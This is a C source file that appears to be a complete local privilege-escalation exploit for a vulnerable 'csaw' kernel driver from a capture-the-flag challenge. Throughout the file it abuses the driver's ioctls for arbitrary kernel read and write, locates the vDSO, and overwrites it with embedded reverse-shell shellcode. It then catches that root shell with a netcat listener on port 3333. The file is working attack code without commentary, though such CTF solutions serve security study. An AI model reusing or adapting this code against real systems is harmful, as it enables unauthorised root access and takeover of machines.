#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/auxv.h>
#include <sys/prctl.h>

#define CSAW_IOCTL_BASE     0x77617363
#define CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1
#define CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2
#define CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3
#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4
#define CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5
#define CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6
#define CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7
#define CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8

struct alloc_channel_args{
    size_t buf_size;
    int id;
};

struct shrink_channel_args{
    int id;
    size_t size;
};

struct read_channel_args{
    int id;
    char *buf;
    size_t count;
};

struct write_channel_args{
    int id;
    char *buf;
    size_t count;
};

struct seek_channel_args{
    int id;
    loff_t index;
    int whence;
};

size_t check_have_writed(char * shellcode)
{
    size_t vdso_usr, ret;
    vdso_usr = getauxval(AT_SYSINFO_EHDR);
    printf("[+] vdso_usr:0x%lx\n", vdso_usr);
    ret = memmem(vdso_usr, 0x1000, shellcode, strlen(shellcode));
    //printf("[~] ret: 0x%lx", ret);
    if(ret){
        //printf("[~] ret: 0x%lx", ret);
        return ret;
    }
    return 0;
}

int main(int argc, char *argv[], char *envp[])
{
    struct alloc_channel_args alloc_channel;
    struct shrink_channel_args shrink_channel;
    struct read_channel_args read_channel;
    struct write_channel_args write_channel;
    struct seek_channel_args seek_channel;

    //setvbuf(stdout, 0LL, 2, 0LL);
    char *buf = malloc(0x1000);
    char pid[1];
    size_t addr;
    size_t search;
    size_t cred, real_cred, task_struct;
    size_t vdso_kernel, vdso_usr;
    char *comm = "gettimeofday\0";
    char shellcode[] = "\x90\x53\x48\x31\xc0\xb0\x66\x0f\x05\x48\x31\xdb\x48\x39\xc3\x75\x0f\x48\x31\xc0\xb0\x39\x0f\x05\x48\x31\xdb\x48\x39\xd8\x74\x09\x5b\x48\x31\xc0\xb0\x60\x0f\x05\xc3\x48\x31\xd2\x6a\x01\x5e\x6a\x02\x5f\x6a\x29\x58\x0f\x05\x48\x97\x50\x48\xb9\xfd\xff\xf2\xfa\x80\xff\xff\xfe\x48\xf7\xd1\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x48\x31\xdb\x48\x39\xd8\x74\x07\x48\x31\xc0\xb0\xe7\x0f\x05\x90\x6a\x03\x5e\x6a\x21\x58\x48\xff\xce\x0f\x05\x75\xf6\x48\xbb\xd0\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xd3\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x0f\x05";

    //prctl(PR_SET_NAME, comm);

    int fd = open("/dev/csaw", O_RDWR);
    if(fd < 0){
        printf("[-] open dev error!\n");
        return 0;
    }
    alloc_channel.id = -1;
    alloc_channel.buf_size = 0x100;
    ioctl(fd, CSAW_ALLOC_CHANNEL, &alloc_channel);
    if(alloc_channel.id == -1){
        printf("[-] alloc channel failed!\n");
        return 0;
    }

    shrink_channel.id = alloc_channel.id;
    shrink_channel.size = 0x101;
    ioctl(fd, CSAW_SHRINK_CHANNEL, &shrink_channel);

    for(addr = 0xffffffff80000000; addr < 0xffffffffffffefff; addr += 0x1000){
        seek_channel.id = alloc_channel.id;
        seek_channel.index = addr-0x10;
        seek_channel.whence = SEEK_SET;
        ioctl(fd, CSAW_SEEK_CHANNEL, &seek_channel);

        read_channel.id = alloc_channel.id;
        read_channel.buf = buf;
        read_channel.count = 0x1000;
        ioctl(fd, CSAW_READ_CHANNEL, &read_channel);
        search = memmem(read_channel.buf, 0x1000, "gettimeofday", 12);
        if(search && ((search -(size_t)buf) == 0x2cd)){
                //printf("[+] The offset of gettimeofday is 0x%lx\n", search - (size_t)buf);
                vdso_kernel = addr;
                printf("[+] vdso_kernel: 0x%lx\n",vdso_kernel);
                break;
            }
    }

    vdso_usr = getauxval(AT_SYSINFO_EHDR);
    printf("[+] vdso_usr1 :0x%lx\n", vdso_usr);

    seek_channel.id = alloc_channel.id;
    seek_channel.index = vdso_kernel - 0x10 + 0xc80;
    seek_channel.whence = SEEK_SET;
    ioctl(fd, CSAW_SEEK_CHANNEL, &seek_channel);

    write_channel.id = alloc_channel.id;
    write_channel.buf = shellcode;
    write_channel.count = strlen(shellcode);
    ioctl(fd, CSAW_WRITE_CHANNEL, &write_channel);

    if(check_have_writed(shellcode) != 0){
        printf("[+] shellcode have been writed!\n");
        printf("[+] now you get root!\n");
        system("nc -lp 3333");
    }else{
        printf("[-] failed!\n");
    }

    return 0;
}


